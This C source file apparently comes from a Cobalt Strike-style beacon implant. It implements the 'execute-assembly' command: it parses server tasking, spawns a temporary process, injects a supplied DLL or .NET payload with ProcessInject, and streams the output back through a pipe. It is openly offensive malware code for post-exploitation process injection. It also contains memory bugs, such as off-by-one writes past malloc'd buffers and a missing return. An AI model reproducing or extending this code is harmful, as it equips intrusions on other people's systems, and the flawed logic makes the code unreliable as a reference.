#include "Command.h"
#include "Job.h"

unsigned char* ParseArg(unsigned char* buf, size_t* argsize) {
    uint8_t argLenBytes[4];
    if (*argsize == 0) {
        memcpy(argLenBytes, buf + 8, 4);
        uint32_t argLen = bigEndianUint32(argLenBytes);
        if (argLen != 0) {
            unsigned char* arg = (unsigned char*)malloc(argLen);
            memcpy(arg, buf + 12, argLen);
            arg[argLen] = '\0';
            *argsize = 12 + argLen;
            return arg;
        }

    }
    else
    {
        memcpy(argLenBytes, buf + *argsize, 4);
        uint32_t argLen = bigEndianUint32(argLenBytes);
        if (argLen != 0) {
            unsigned char* arg = (unsigned char*)malloc(argLen);
            memcpy(arg, buf + 4 + *argsize, argLen);
            arg[argLen] = '\0';
            *argsize = 4 + *argsize + argLen;
            return arg;
        }

    }

}


void ExecuteAssmblyInjection(int timeout, int p_offset, char* payload, size_t payloadsize, char* arg, int a_len, char* jobname, BOOL x86, int ignoreToken)
{


    HANDLE hReadPipe = NULL;
    HANDLE hWritePipe = NULL;
    SECURITY_ATTRIBUTES securityAttributes = { 0 };
    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    CreatePipeJob Createpipe = createjob();
    hReadPipe = Createpipe.hReadPipe;
    si = Createpipe.si;
    //ProcessInject(GetCurrentProcessId(), &pi, GetCurrentProcess(), payload, payloadsize, p_offset, arg, a_len);

    //注入到其他进程
    if (BeaconSpawnTemporaryProcess(x86, ignoreToken, &si, &pi))
    {
        Sleep(0x64u);
        ProcessInject(pi.dwProcessId, &pi, pi.hProcess, payload, payloadsize, p_offset, arg, a_len);
        /*   if (timeout)
           {
               CheckTimeout(hReadPipe, timeout);
           }*/
        Add_Beacon_0Job(pi.hProcess, pi.hThread, pi.dwProcessId, pi.dwThreadId, hReadPipe, hWritePipe, jobname);

        WaitForSingleObject(pi.hProcess, 5000);
        // Read the result from the anonymous pipe into the output buffer
        bool lastTime = false;
        bool firstTime = true;
        OVERLAPPED overlap = { 0 };
        DWORD readbytes = 0;
        DWORD availbytes = 0;
        unsigned char buffff[1024 * 50];
        while (!lastTime) {


            DWORD event = WaitForSingleObject(pi.hProcess, 0);
            if (event == WAIT_OBJECT_0 || event == WAIT_FAILED) {
                lastTime = TRUE;
            }

            if (!PeekNamedPipe(hReadPipe, NULL, 0, NULL, &availbytes, NULL)) break;
            while (lastTime == false && availbytes == 0) {
                DWORD event = WaitForSingleObject(pi.hProcess, 5000);
                PeekNamedPipe(hReadPipe, NULL, 0, NULL, &availbytes, NULL);
            }

            //if (!availbytes) break;
            //if (!ReadFile(hReadPipe, buffff, min(sizeof(buffff) - 1, availbytes), &readbytes, NULL) || !readbytes) break;
            if (lastTime == false || availbytes != 0) {
                ReadFile(hReadPipe, buffff, sizeof(buffff), NULL, &overlap);
            }

            DWORD bytesTransferred;
            ULONG_PTR completionKey;
            LPOVERLAPPED pOverlapped;

            if (overlap.InternalHigh > 0) {
                if (firstTime) {
                    DataProcess(buffff, overlap.InternalHigh, 0);
                    firstTime = false;
                }
                else {
                    if (lastTime == false) {
                        /*    uint8_t requestIDBytes[5] = "[+] ";
                          uint8_t nnnn[4] = " :\n";*/

                        uint8_t* metaInfoBytes1[] = { buffff };
                        size_t metaInfosizes1[] = { overlap.InternalHigh };
                        size_t metaInfoBytesArrays1 = sizeof(metaInfoBytes1) / sizeof(metaInfoBytes1[0]);
                        uint8_t* metaInfoconcatenated1 = ConByte(metaInfoBytes1, metaInfosizes1, metaInfoBytesArrays1);
                        size_t metaInfoSize1 = 0;
                        // 计算所有 sizeof 返回值的总和
                        for (size_t i = 0; i < sizeof(metaInfosizes1) / sizeof(metaInfosizes1[0]); ++i) {
                            metaInfoSize1 += metaInfosizes1[i];
                        }

                        DataProcess(metaInfoconcatenated1, metaInfoSize1, 0);
                    }
                    else {
                        uint8_t jia[5] = "[+] ";
                        uint8_t nnn[2] = "\n";
                        uint8_t end[75] = "-----------------------------------end-----------------------------------\n";
                        uint8_t* metaInfoBytes[] = { jia,end };
                        size_t metaInfosizes[] = { 5,75 };
                        size_t metaInfoBytesArrays = sizeof(metaInfoBytes) / sizeof(metaInfoBytes[0]);
                        uint8_t* metaInfoconcatenated = ConByte(metaInfoBytes, metaInfosizes, metaInfoBytesArrays);
                        size_t metaInfoSize = 0;
                        // 计算所有 sizeof 返回值的总和
                        for (size_t i = 0; i < sizeof(metaInfosizes) / sizeof(metaInfosizes[0]); ++i) {
                            metaInfoSize += metaInfosizes[i];
                        }
                        DataProcess(metaInfoconcatenated, metaInfoSize, 0);


                    }
                    // buf[readbytes] = 0;
                     //strncat(outbuf, buf, outbuf_size - strlen(outbuf) - 1);
                }
            }

            Sleep(2000);

        }
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        CloseHandle(hWritePipe);
        CloseHandle(hReadPipe);
        /* }
         else
         {
             return 0;
         }*/

    }


}







datap* BeaconDataInit(int size)
{
    char* pdata;
    datap* pdatap;

    pdatap = (datap*)malloc(sizeof(datap));
    if (!pdatap)
    {
        return 0;
    }
    pdata = (char*)malloc(size);
    if (!pdata)
    {
        return 0;
    }
    memset(pdata, 0, size);
    BeaconDataParse(pdatap, pdata, size);
    return pdatap;
}
int BeaconDataCopyToBuffer1(datap* parser, char* buffer, int buffer_size)
{
    int copy_size = BeaconDataInt(parser);
    if (!copy_size)
    {
        return 0;
    }
    if (copy_size + 1 > buffer_size)
    {
        return 0;
    }
    char* data = BeaconDataPtr(parser, copy_size);
    if (!data)
    {
        return 0;
    }
    memcpy(buffer, data, copy_size);
    buffer[copy_size] = 0;
    return copy_size + 1;
}
char* BeaconDataBuffer(datap* parser)
{
    return parser->buffer;
}
void ParseAssember(unsigned char* buf, size_t* commandBuflen) {

    uint8_t callbackTypeByte[2];

    uint8_t sleepTimeByte[2];
    uint8_t offset[4];
    unsigned char* callbackTypeBytestart = buf;
    unsigned char* sleepTimeBytestart = buf + 2;
    unsigned char* offsetstart = buf + 4;
    memcpy(callbackTypeByte, callbackTypeBytestart, 2);
    memcpy(sleepTimeByte, sleepTimeBytestart, 2);
    memcpy(offset, offsetstart, 4);
    uint32_t offsetType = bigEndianUint32(offset);
    uint16_t callBackType = Readshort(callbackTypeByte);
    uint16_t sleepTime = Readshort(sleepTimeByte);
    size_t ParseArgSize = 0;
    unsigned char* jobname = 0;
    unsigned char* csharp = 0;
    jobname = ParseArg(buf, &ParseArgSize);
    csharp = ParseArg(buf, &ParseArgSize);
    size_t dlllen = (size_t)commandBuflen - ParseArgSize;
    unsigned char* dll = (unsigned char*)malloc(dlllen);
    dll[dlllen] = '\0';
    memcpy(dll, buf + ParseArgSize, dlllen);
    ExecuteAssmblyInjection(sleepTime, offsetType, dll, dlllen, csharp, ParseArgSize, jobname, 1, 0);






}

unsigned char* EXECUTE_ASSEMBLY(unsigned char* buf, size_t* commandBuflen, size_t* Bufflen) {
    ParseAssember(buf, commandBuflen);
}